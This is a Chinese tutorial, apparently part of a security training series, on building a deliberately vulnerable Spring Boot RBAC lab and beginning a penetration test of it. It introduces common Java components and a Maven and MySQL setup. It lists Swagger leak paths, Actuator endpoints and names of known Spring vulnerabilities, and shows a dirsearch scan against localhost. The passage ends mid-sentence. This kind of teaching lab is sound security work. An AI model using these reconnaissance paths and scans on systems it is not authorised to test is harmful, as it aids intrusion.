版本信息。</p><ul><li>使用IDEA创建Maven项目</li></ul><p>1、打开IDEA，点击<code>Create New Porject</code>，选择<code>Maven</code>，如下图所示：</p><p><img src="/img/maven%E5%88%9B%E5%BB%BA.jpg" alt="maven创建"></p><p>2、默认即可（在真实需求中，可以根据自己的项目，选择不同模板），点击Next，然后点击Finish。一个最基本的<code>Maven项目结构</code>如下图所示：</p><p><img src="/img/maven%E9%A1%B9%E7%9B%AE%E7%BB%93%E6%9E%84.jpg" alt="maven项目结构"></p><p>配置源加速，自行百度就可以了。</p><h4 id="A2、SpringBoot简介"><a href="#A2、SpringBoot简介" class="headerlink" title="A2、SpringBoot简介"></a>A2、SpringBoot简介</h4><p>SpringBoot是一款基于JAVA的开源框架。目的是为了简化Spring应用搭建和开发流程。是目前比较流行，大中小型企业常用的框架。正因为极大简化了开发流程，才收到绝大开发人员的喜爱。SpringBoot核心原理是自动装配（自动配置），在这之前，开发一个JavaWeb，Spring等项目要进行很多配置，使用了SpringBoot就不用在过多考虑这些方面。并且在SpringBoot中还内置了Tomcat。</p><ul><li>SpringBoot之HelloWorld</li></ul><p>通过经典HelloWorld程序，来看看Springboot项目搭建多么简便。</p><p>1、打开IDEA，选择<code>Create New Project</code>，选择<code>Spring Initializer</code>，右侧勾选<code>Default</code>，如下图所示：</p><p><img src="/img/SpringBootHelloworld1.jpg" alt="SpringBootHelloworld1"></p><p>2、点击Next，<code>Srping Initializr Project Settings</code>配置内容默认就好，我们不做实际项目开发，如下图所示：</p><p><img src="/img/helloworld%E9%85%8D%E7%BD%AE.jpg" alt="helloworld配置"></p><p>3、点击Next，进入依赖项选择页面，我们选择<code>Web -&gt; Spring Web</code>这一个即可，如下图所示：</p><p><img src="/img/helloworld%E4%BE%9D%E8%B5%96%E9%80%89%E6%8B%A9.jpg" alt="helloworld依赖选择"></p><p>4、点击Next，填写项目名称和存放地址。练习项目，默认就可以，点击<code>Finish</code>，完成创建。</p><p>5、Maven自动加载完所需依赖后，整体项目结构如下图所示：</p><p><img src="/img/helloworld%E9%A1%B9%E7%9B%AE%E7%BB%93%E6%9E%84.jpg" alt="helloworld项目结构"></p><p><code>@SpringBootApplication</code>注解表示这个类为SpringBoot的主配置类，SpringBoot项目应运行这个类下面的main方法来启动SpringBoot应用。</p><p>6、创建<code>HelloController</code>，创建一个<code>controller</code>包，下面创建一个HelloController，在该controller中编写代码，如下图所示：</p><p><img src="/img/helloworld%E4%BB%A3%E7%A0%81.jpg" alt="helloworld代码"></p><p>7、点击右上方运行，打开浏览器输入<code>http://127.0.0.1:8080/hello</code>，即可看到helloworld，如下图所示：</p><p><img src="/img/%E8%BF%94%E5%9B%9Ehelloworld.jpg" alt="返回helloworld"></p><p><code>@Controller</code>注解：标注该类为controller类，可以处理http请求。@Controller一般要配合模版来使用。现在项目大多是前后端分离，后端处理请求，然后返回JSON格式数据即可，这样也就不需要模板了。</p><p><code>@ResponseBody</code>注解：将该注解写在类的外面，表示这个类所有方法的返回的数据直接给浏览器。<code> @RestController 相当于 @ResponseBody 加上 @Controller</code></p><p><code>@RequestMapping</code>注解：配置<code>URL映射</code>，可以作用于某个Controller类上，也可以作用于某Controller类下的具体方法中，说白了就是URL中请求路径会直接映射到具体方法中执行代码逻辑。</p><p><code>@PathVariable</code>注解：接受请求URL路径中占位符的值，示例代码如下图所示：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-meta">@Controller</span><br><span class="hljs-meta">@ResponseBody</span><br><span class="hljs-meta">@RequestMapping</span>(<span class="hljs-string">&quot;/hello&quot;</span>)<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloController</span> &#123;<br>    <span class="hljs-meta">@RequestMapping</span>(<span class="hljs-string">&quot;/whoami/&#123;name&#125;/&#123;sex&#125;&quot;</span>)<br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span>  <span class="hljs-title function_">hello</span>(<span class="hljs-params"><span class="hljs-meta">@PathVariable</span>(<span class="hljs-string">&quot;name&quot;</span>) <span class="hljs-built_in">String</span> name, <span class="hljs-meta">@PathVariable</span>(<span class="hljs-string">&quot;sex&quot;</span>) <span class="hljs-built_in">String</span> sex</span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello&quot;</span> + name + sex;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>@RequestParam</code>注解：将请求参数绑定到你控制器的方法参数上（是springmvc中接收普通参数的注解），常用于POST请求处理表单。</p><h4 id="A3、SpringSecurity简介"><a href="#A3、SpringSecurity简介" class="headerlink" title="A3、SpringSecurity简介"></a>A3、SpringSecurity简介</h4><p>Spring 是一个非常流行和成功的java应用开发框架。 Spring Security 基于Spring 框架，提供了一套web应用安全性的完整解决方案。</p><p>一般来说，Web 应用的安全性包括两部分：</p><p>  　　1. 用户<strong>认证</strong>（Authentication）</p><p>　　用户认证指的是验证某个用户是否为系统中的合法主体，也就是说用户能否访问该系统。用户认证一般要求用户提供用户名和密码。系统通过校验用户名和密码来完成认证过程。</p><p>  　　2. 用户<strong>授权</strong>（Authorization）</p><p>　　用户授权指的是验证某个用户是否有权限执行某个操作。在一个系统中，不同用户所具有的权限是不同的。比如对一个文件来说，有的用户只能进行读取，而有的用户可以进行修改。</p><p>一般来说，系统会为不同的用户分配不同的角色，而每个角色则对应一系列的权限。</p><p>对于上面提到的两种应用情景，Spring Security 框架都有很好的支持。</p><p>在用户<strong>认证</strong>方面，Spring Security 框架支持主流的认证方式，包括 HTTP 基本认证、HTTP 表单验证、HTTP 摘要认证、OpenID 和 LDAP 等。</p><p>在用户<strong>授权</strong>方面，Spring Security 提供了基于角色的访问控制和访问控制列表（Access Control List，ACL），可以对应用中的领域对象进行细粒度的控制。</p><h4 id="A4、Mybatis简介"><a href="#A4、Mybatis简介" class="headerlink" title="A4、Mybatis简介"></a>A4、Mybatis简介</h4><p>MyBatis 是一款优秀的持久层框架，它支持自定义 SQL、存储过程以及高级映射。MyBatis免除了几乎所有的 JDBC 代码以及设置参数和获取结果集的工作。</p><p>MyBatis可以通过简单的 XML 或注解来配置和映射原始类型、接口和 Java POJO（Plain Old Java Objects，普通老式 Java 对象）为数据库中的记录。</p><p>它内部封装了jdbc，使开发者只需要关注sql语句本身，而不需要花费精力去处理加载驱动、创建连接、创建statement等繁杂的过程。</p><p>官网：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//my</span>batis.org<span class="hljs-regexp">/mybatis-3/</span>zh/index.html<br></code></pre></td></tr></table></figure><p>配置文件常存放在<code>src/main/resources/mapper</code>中，配置文件命名为<code>xxxxMapper.xml</code></p><p>Mybatis拼接sql有下面两种方式：</p><p><code>#&#123;&#125;</code>告诉 MyBatis 创建一个预编译语句（PreparedStatement）参数，在 JDBC 中，这样的一个参数在 SQL 中会由一个“?”来标识，并被传递到一个新的预处理语句中。</p><p><code>$&#123;&#125;</code> 仅仅是纯粹的 string 替换，在动态 SQL 解析阶段将会进行变量替换，类似于直接替换字符串，会导致SQL注入产生。like+#{ }</p><h4 id="A5、Swagger简介"><a href="#A5、Swagger简介" class="headerlink" title="A5、Swagger简介"></a>A5、Swagger简介</h4><p>Swagger 是一款RESTful接口的文档在线自动生成加功能测试的软件。目的是为了减少与其他团队的沟通成本，因此会使用Swagger构建RESTful API文档来描述所有的接口信息。</p><p><img src="/img/swagger%E9%A1%B5%E9%9D%A2.jpg" alt="swagger页面"></p><p> 官方网站：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>swagger.io/<br></code></pre></td></tr></table></figure><p>常见Swagger敏感信息泄露的路径：</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs crystal">/swagger/<br><span class="hljs-regexp">/api/swagger</span><span class="hljs-regexp">/</span><br><span class="hljs-regexp">/swagger</span><span class="hljs-regexp">/ui/</span><br><span class="hljs-regexp">/api/swagger</span><span class="hljs-regexp">/ui/</span><br><span class="hljs-regexp">/swagger-ui.html/</span><br><span class="hljs-regexp">/api/swagger</span>-ui.html/<br><span class="hljs-regexp">/user/swagger</span>-ui.html/<br><span class="hljs-regexp">/swagger/ui</span><span class="hljs-regexp">/</span><br><span class="hljs-regexp">/api</span><span class="hljs-regexp">/swagger/ui</span><span class="hljs-regexp">/</span><br><span class="hljs-regexp">/libs</span><span class="hljs-regexp">/swaggerui/</span><br><span class="hljs-regexp">/api/swaggerui</span><span class="hljs-regexp">/</span><br><span class="hljs-regexp">/swagger</span>-resources/configuration/ui/<br><span class="hljs-regexp">/swagger-resources/configuration</span><span class="hljs-regexp">/security/</span><br>......<br></code></pre></td></tr></table></figure><p>Swagger组件特征固定title：<code>Swagger UI</code></p><h4 id="A6、Thymeleaf简介"><a href="#A6、Thymeleaf简介" class="headerlink" title="A6、Thymeleaf简介"></a>A6、Thymeleaf简介</h4><p>官方学习文档：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.thymeleaf.org/<br>https:<span class="hljs-regexp">//</span>www.thymeleaf.org<span class="hljs-regexp">/doc/</span>tutorials<span class="hljs-regexp">/3.0/u</span>singthymeleaf.html<br></code></pre></td></tr></table></figure><p>Thymeleaf是一个流行的模板引擎，该模板引擎采用Java语言开发。模板引擎（这里特指用于Web开发的模板引擎）是为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，用于网站的模板引擎就会生成一个标准的html文档。从字面上理解模板引擎，最重要的就是模板二字，这个意思就是做好一个模板后套入对应位置的数据，最终以html的格式展示出来，这就是模板引擎的作用。</p><p>例子：</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">table</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">thead</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">th</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;#</span></span></span><span class="hljs-template-variable">&#123;msgs.headers.name&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span>&gt;</span>Name<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">th</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;#</span></span></span><span class="hljs-template-variable">&#123;msgs.headers.price&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span>&gt;</span>Price<span class="hljs-tag">&lt;/<span class="hljs-name">th</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">thead</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">tbody</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">tr</span> <span class="hljs-attr">th:each</span>=<span class="hljs-string">&quot;prod : $</span></span></span><span class="hljs-template-variable">&#123;allProducts&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;$</span></span></span><span class="hljs-template-variable">&#123;prod.name&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span>&gt;</span>Oranges<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">th:text</span>=<span class="hljs-string">&quot;$</span></span></span><span class="hljs-template-tag">&#123;#<span class="hljs-name">numbers.formatDecimal</span>(prod.price,1,2)&#125;</span><span class="language-xml"><span class="hljs-tag"><span class="hljs-string">&quot;</span>&gt;</span>0.99<span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span></span><br><span class="language-xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">tbody</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">table</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>拓展学习，大致了解每个标签作用：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.w3xue.com<span class="hljs-regexp">/exp/</span>article<span class="hljs-regexp">/20199/</span><span class="hljs-number">54847</span>.html<br></code></pre></td></tr></table></figure><h4 id="A7、SpringBoot-Actuator简介"><a href="#A7、SpringBoot-Actuator简介" class="headerlink" title="A7、SpringBoot Actuator简介"></a>A7、SpringBoot Actuator简介</h4><p>Actuator主要用于公开有关正在运行的应用程序的运行信息 - 运行状况，指标，信息，转储，env等等。它使用HTTP端点或JMX bean来使我们能够与它进行交互。</p><p>一些常见的执行端点：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs awk">/beans：此端点返回应用程序中配置的所有bean的列表。<br>/env：提供有关Spring Environment属性的信息。<br>/health：显示应用程序运行状况<br>/info：显示应用程序信息，我们可以在Spring环境属性中配置它。<br>/mappings：显示所有 @RequestMapping 路径的列表 。<br>/shutdown：允许我们正常关闭应用程序。<br>/threaddump：提供应用程序的线程转储。<br><br>完整可执行的端点，详见官网：<br>https:<span class="hljs-regexp">//</span>docs.spring.io<span class="hljs-regexp">/spring-boot/</span>docs<span class="hljs-regexp">/current/</span>reference<span class="hljs-regexp">/html/</span>actuator.html<span class="hljs-comment">#actuator.endpoints</span><br></code></pre></td></tr></table></figure><h4 id="A8、Druid简介"><a href="#A8、Druid简介" class="headerlink" title="A8、Druid简介"></a>A8、Druid简介</h4><p>Druid是阿里研发的一款数据库连接池，其开发语言为java，druid集合了c3p0、dbcp、proxool等连接池的优点，还加入了日志监控、session监控等数据监控功能，使用Druid能有效的监控DB池连接和SQL的执行情况。</p><p>项目地址：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/alibaba/</span>druid<br></code></pre></td></tr></table></figure><h3 id="B、相关漏洞"><a href="#B、相关漏洞" class="headerlink" title="B、相关漏洞"></a><strong>B、相关漏洞</strong></h3><p>上述常见的组件存在已知的漏洞，具体对应如下（不完全统计）：</p><table><thead><tr><th>漏洞名称</th></tr></thead><tbody><tr><td>Spring Security验证绕过漏洞</td></tr><tr><td>Spring Security认证绕过</td></tr><tr><td>Spring Boot框架SPEL表达式注入漏洞</td></tr><tr><td>Spring Security未经授权的访问</td></tr><tr><td>Spring Boot Actuator命令执行漏洞</td></tr><tr><td>Spring Boot Actuator hikari配置不当导致的远程命令执行漏洞</td></tr><tr><td>Spring Boot Actuator jolokia 配置不当导致的XXE漏洞</td></tr><tr><td>Spring Boot Thymeleaf 模板注入</td></tr><tr><td>Spring Boot Tomcat导致的JNDI注入</td></tr><tr><td>Spring Boot eureka xstream deserialization rce</td></tr><tr><td>Spring Boot h2 database query rce</td></tr><tr><td>Spring Boot mysql jdbc deserialization rce</td></tr><tr><td>Spring Boot sql</td></tr><tr><td>Spring Boot whitelabel error page SpEL rce</td></tr><tr><td>Spring Boot 修改环境属性导致的rce</td></tr><tr><td>Spring Boot 提取内存密码</td></tr><tr><td>Spring Boot 获取被星号脱敏的密码的明文 (方法一)</td></tr><tr><td>Spring Boot 路由地址及接口调用详情泄漏</td></tr><tr><td>Spring Boot 配置不当而暴露的路由</td></tr><tr><td>Druid未授权访问</td></tr></tbody></table><h2 id="二、项目安装"><a href="#二、项目安装" class="headerlink" title="二、项目安装"></a>二、项目安装</h2><h3 id="A、所需环境"><a href="#A、所需环境" class="headerlink" title="A、所需环境"></a><strong>A、所需环境</strong></h3><p>本项目安装基于<strong>windows 10</strong>操作系统搭建而成。</p><h4 id="1、Java环境部署"><a href="#1、Java环境部署" class="headerlink" title="1、Java环境部署"></a>1、Java环境部署</h4><p>Java版本如下图所示：</p><p><img src="/img/javaversion.jpg" alt="javaversion"></p><p>JDK下载链接：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.oracle.com<span class="hljs-regexp">/java/</span>technologies<span class="hljs-regexp">/downloads/</span><span class="hljs-comment">#java8-windows</span><br></code></pre></td></tr></table></figure><p>安装步骤操作简单，只需下一步即可，不过多赘述。</p><h4 id="2、Maven环境部署"><a href="#2、Maven环境部署" class="headerlink" title="2、Maven环境部署"></a>2、Maven环境部署</h4><p>关于Maven环境部署与安装，可参考下面的文章，安装最新版即可。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.runoob.com<span class="hljs-regexp">/maven/m</span>aven-setup.html<br></code></pre></td></tr></table></figure><p>在IDEA中内置了Maven，对于我们来说足够用了。</p><p><strong>Maven加速配置</strong></p><p>配置国内源下载一些依赖组件会非常快，但会有极个别情况，有些组件使用国内源无法下载，则需要再更改配置，大家留有印象就好。</p><p>①、访问<code>c:\Users\当前用户\.m2</code>目录，当前用户文件夹需要根据当前用户来定，如下图所示：</p><p><img src="/img/maven%E5%8A%A0%E9%80%9F.jpg" alt="maven加速"></p><p>②、打开<code>settings.xml</code>文件，复制粘贴以下内容：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">settings</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://maven.apache.org/SETTINGS/1.0.0&quot;</span> <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag"><span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://maven.apache.org/SETTINGS/1.0.0 http://maven.apache.org/xsd/settings-1.0.0.xsd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">pluginGroups</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">pluginGroups</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">proxies</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">proxies</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">localRepository</span>&gt;</span>C:\Users\当前用户\.m2\repository<span class="hljs-tag">&lt;/<span class="hljs-name">localRepository</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">servers</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">servers</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">mirrors</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">mirror</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">id</span>&gt;</span>aliyunmaven<span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">mirrorOf</span>&gt;</span>*<span class="hljs-tag">&lt;/<span class="hljs-name">mirrorOf</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>阿里云公共仓库<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">url</span>&gt;</span>https://maven.aliyun.com/repository/public<span class="hljs-tag">&lt;/<span class="hljs-name">url</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">mirror</span>&gt;</span> <br><span class="hljs-tag">&lt;/<span class="hljs-name">mirrors</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">profiles</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">profiles</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">activeProfiles</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">activeProfile</span>&gt;</span>nexus<span class="hljs-tag">&lt;/<span class="hljs-name">activeProfile</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">activeProfiles</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">settings</span>&gt;</span> <br></code></pre></td></tr></table></figure><p>注意代码中的<code>当前用户</code>该位置路径应与你当前用户一致。</p><h4 id="3、Mysql环境部署"><a href="#3、Mysql环境部署" class="headerlink" title="3、Mysql环境部署"></a>3、Mysql环境部署</h4><p>个人偏好于使用phpstudy，它集成了很多常用组件，如apache，mysql等。作为练习，方便至极，一键启动即可使用。</p><p><strong>官方下载链接：</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.xp.cn/<br></code></pre></td></tr></table></figure><p>下载完成后，双击进入软件。进入首页处，选择mysql套件，点击启动即可，如下图所示：</p><p><img src="/img/mysql%E5%90%AF%E5%8A%A8.jpg" alt="mysql启动"></p><p>点击左侧<code>数据库</code>，可以对数据库进行<code>密码修改</code>操作。</p><h4 id="4、IDEA"><a href="#4、IDEA" class="headerlink" title="4、IDEA"></a>4、IDEA</h4><p>官方下载地址，可选择使用<code>Ultimate</code>版本。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.jetbrains.com<span class="hljs-regexp">/zh-cn/i</span>dea<span class="hljs-regexp">/download/</span><span class="hljs-comment">#section=windows</span><br></code></pre></td></tr></table></figure><h3 id="B、环境搭建"><a href="#B、环境搭建" class="headerlink" title="B、环境搭建"></a><strong>B、环境搭建</strong></h3><p>安装整体过程首先将数据导入mysql数据库中，然后将项目导入IDEA中，修改配置文件中数据库信息，点击启动即完成环境搭建。</p><p>①、在phpstudy中启动Mysql</p><p><img src="/img/%E5%90%AF%E5%8A%A8mysql.jpg" alt="启动mysql"></p><p>②、启动cmd命令行，进入mysql数据库，命令：<code>mysql -u root -p</code>，然后键入你的密码。</p><p><img src="/img/%E8%BF%9B%E5%85%A5mysql.jpg" alt="进入mysql"></p><p>③、使用命令创建数据库：<code>create database rbac;</code>。使用命令选择rbac数据库：<code>use rbac;</code></p><p><img src="/img/%E5%88%9B%E5%BB%BA%E4%B8%8E%E9%80%89%E6%8B%A9rbac%E6%95%B0%E6%8D%AE%E5%BA%93.jpg" alt="创建rbac数据库"></p><p>④、导入<code>rbac.sql</code>文件，该文件位于<code>RefiningStone-RBAC</code> 项目文件夹内。在导入时务必注意路径中的正斜杠。使用命令<code>source</code>导入数据，如下图所示：</p><p><img src="/img/%E5%AF%BC%E5%85%A5rbac.jpg" alt="导入rbac"></p><p>最后全部为<code>Query OK...</code>，无报错，即为全部导入成功。</p><p>⑤、打开IDEA，点击<code>Open or import</code>，选择项目文件夹下的<code>pom.xml</code>文件，最后选择打开方式为<code>Open as project</code>，如下图所示：</p><p><img src="/img/%E5%AF%BC%E5%85%A5%E9%A1%B9%E7%9B%AE1.jpg" alt="导入项目1"></p><p><img src="/img/%E5%AF%BC%E5%85%A5%E9%A1%B9%E7%9B%AE2.jpg" alt="导入项目2"></p><p>也可以右键选择文件夹，点击<code>Open folder as Intellij IDEA project...... </code></p><p>第一次导入项目，Maven会自动下载所需依赖，会花费一些时间。</p><p>⑥、几个现象表明项目部署成功。<code>pom.xml</code>文件无报错，项目代码已编译为<code>class</code>，<code>Edit Configurations...</code>处显示可以运行。</p><p><img src="/img/%E9%A1%B9%E7%9B%AE%E5%AF%BC%E5%85%A5%E6%88%90%E5%8A%9F.jpg" alt="项目导入成功"></p><p>⑦、进入<code>src - main - resources - application.yml</code>，对配置文件进行相关修改，主要修改Mysql数据库连接账号密码，具体可以去phpstudy下数据库处查看。</p><p><img src="/img/%E4%BF%AE%E6%94%B9%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AF%86%E7%A0%81.jpg" alt="修改数据库密码"></p><p>⑧、万事具备，点击右上侧启动即可。下侧console控制台中信息无任何报错，即为启动成功，另外需要注意的是启动端口是多少，启动端口可以在<code>application.yml</code>文件中更改<code>port</code>的值。<img src="/img/%E7%82%B9%E5%87%BB%E5%90%AF%E5%8A%A8.jpg" alt="点击启动"></p><p>⑨、打开浏览器，键入<code>http://127.0.0.1:8088/login.html</code>，访问项目。</p><p><img src="/img/%E8%AE%BF%E9%97%AE%E9%A1%B9%E7%9B%AE.jpg" alt="访问项目"></p><p>至此，环境已搭建完毕，可以开始面的练习了。</p><p><strong>注意：</strong></p><p>在搭建中难免会出现各种问题。务必先自行分析报错，尝试解决问题。</p><p>实在搞不定，可以在群里对问题进行描述后@我。</p><h2 id="三、漏洞挖掘之渗透测试"><a href="#三、漏洞挖掘之渗透测试" class="headerlink" title="三、漏洞挖掘之渗透测试"></a>三、漏洞挖掘之渗透测试</h2><h3 id="3-1、信息收集"><a href="#3-1、信息收集" class="headerlink" title="3.1、信息收集"></a>3.1、信息收集</h3><ul><li>dirsearch扫目录</li></ul><p>使用dirsearch等相关敏感目录扫描工具，对目标进行扫描，探测敏感目录。</p><p>执行命令：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">github:<br>https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/maurosoria/</span>dirsearch<br><br>py -<span class="hljs-number">3</span> dirsearch.py -u http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8088</span>/ -e * -x <span class="hljs-number">404</span>,<span class="hljs-number">500</span>,<span class="hljs-number">400</span><br>-e *：探测的扩展列表，比如asp,jsp,php等，*（星号）表示所有。<br>-x：表示屏蔽的响应码，根据自己实际需求填写，使用逗号分隔。<br></code></pre></td></tr></table></figure><p>扫描结果，如下图所示：</p><p><img src="/img/dirsearch%E6%89%AB%E6%8F%8F%E7%BB%93%E6%9E%9C.jpg" alt="dirsearch扫描结果"></p><ul><li>异常信息泄露</li></ul><p>很多系统没有处理好全局异常信息的话，会直接将异常报错信息返回到前端。异常报错信息中可能会携带敏感信息。</p><p>一般情况下<code>异常信息泄露</code>会配合<code>4XX</code>，<code>5XX</code>等响应码出现。</p><p><strong>举例说明：</strong></p><p><code>400</code>响应码：因发送的请求语法错误，服务器无法正常读取。</p><p><code>500</code>响应码：（服务器内部错误） 服务器遇到错误，无法完成请求。</p><p>在使用dirsearch探测目录时，如果没有屏蔽400，500等响应码时，可能会触发相关报错。我们可以复制路径进一步查看报错，如下图所示：</p><p><img src="/img/%E5%BC%82%E5%B8%B8%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-dirsearch.jpg" alt="异常信息泄露-dirsearch"></p><p><img src="/img/%E5%BC%82%E5%B8%B8%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B22.jpg" 